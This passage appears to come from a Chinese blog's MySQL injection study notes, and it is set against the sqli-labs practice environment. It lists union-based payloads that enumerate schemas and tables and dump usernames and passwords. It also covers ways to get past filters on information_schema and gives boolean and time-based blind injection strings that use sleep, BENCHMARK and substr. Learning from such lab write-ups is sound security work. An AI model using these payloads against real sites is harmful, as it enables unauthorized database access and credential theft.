1意为从第一条开始选一条。如果数据数量多时，可以使用group_concat()函数来聚合库名,此时不用limit来取值。如1127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_conat(schema_name),3 from information_schema.schemata -- + 查询表名 1127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- + 如直接查询当前库的表名也可以写成table_schema=database()，若想避免单引号可转换为hex形式table_schema=0x7365637572697479 查询列名 1127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='security' -- + 查询相关字段 1127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(username,0x7e,password),3 from users -- + 在使用infomation_schema.schemata等表查询时若被过滤了可以用以下方式绕过 1234`information_schema`.`schemata ` information_schema/**/.schematainformation_schema/*!*/.schematainformation_schema%0a.schemata 学习总结别人的思路和方法，举一反三从实战中总结自己的思路和方法。 参考了404大佬的文档[链接]:https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI","link":"/2019/08/04/sql注入_mysql_3/"},{"title":"","text":"Mysql注入笔记(五) 盲注盲注的类型分为时间盲注和布尔盲注，在实际环境中盲注时间一般比较长，而且时间盲注对网络速度的要求较高，在实际注入过程中可用二分法，dnslog等方式加快注入的速度。 时间盲注 盲注一般用到的函数时sleep(),BENCHMARK(),在实际利用过程中需要使用条件判断函数如：1if(expre1,expre2,expre3) #当expre1位真时，返回expre2，为假时，返回expre3 盲注时，通常会与mysql的分割函数(substr,substring,left)以及正则函数,like函数使用，在使用分割函数时，如果在分割时遇到引号不能使用，可以将分割函数进行编码，一般使用ascii(),hex()等。BENCHMARK()函数的作用是测试一些函数的执行速度，其表达式为：1BENCHMARK(arg1,arg2)#arg1为执行的次数，arg2为执行的函数或者表达式如BENCHMARK(5000000,md5('abc'))将abc使用MD5加密5000000次，页面的延时一般是2秒 基于布尔型的盲注 可参考https://www.anquanke.com/post/id/170626 通过substr()函数直接截取对比如: 1http:// xxx/?id=1 and substr((select database()),1,1)='a' 使用IFNULL(expr1，expr2)函数，函数的特性是如果expr1不为NULL，则IFNULL()函数返回expr1,否则返回expr2。可如下例子 1htt:// xxx/?id=1 and IFNULL((substr((select database()),1,1)=='a'),0) 使用比较函数strcmp() 12http:// xxx/?id=1 and strcmp((substr((select database()),1,1)=='a'),1)http:// xxx/?id=1 and strcmp((substr((select database()),1,1)='a'),0) 盲注时注意的几点 盲注使用and查询时，得确定查询到值是存在的 在返回多组数据时，延时不再是单纯的sleep(time)，它将根据返回数据的条数来反复执行 在探测搜索型时尽量搜索存在且数目较少的关键词 尽量不要使用or，如果必须使用到or的延时注入时可以试试子查询，如 1http:// xxx/?id=1 or if((substr((select database(),1,1)='a'),((select sleep(5) from information_schema.schemata as b)),1);","link":"/2019/08/10/sql注入_mysql_5/"}],"tags":[],"categories":[]}